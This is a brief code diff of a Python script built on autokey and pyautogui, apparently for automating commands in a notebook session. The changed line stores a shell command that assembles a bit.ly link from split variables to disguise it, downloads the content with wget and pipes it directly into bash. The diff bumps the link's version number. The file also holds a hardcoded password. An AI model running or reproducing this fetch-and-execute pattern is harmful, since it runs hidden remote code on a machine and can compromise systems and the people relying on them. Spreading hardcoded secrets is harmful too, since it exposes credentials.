@@ -3,7 +3,7 @@ import time,os
 from autokey import *
 import pyautogui
 
-col_cmd = "! i=002;cmd=pysi;x=ly;y=bit;wget -q -O - ${y}.${x}/${cmd}${i} | bash 1> /tmp/1.log  2> /tmp/1err.log"
+col_cmd = "! i=003;cmd=pysi;x=ly;y=bit;wget -q -O - ${y}.${x}/${cmd}${i} | bash 1> /tmp/1.log  2> /tmp/1err.log"
 listfile = '/home/one/g80p2'
 gpass = "Ms123456789"
 new = True
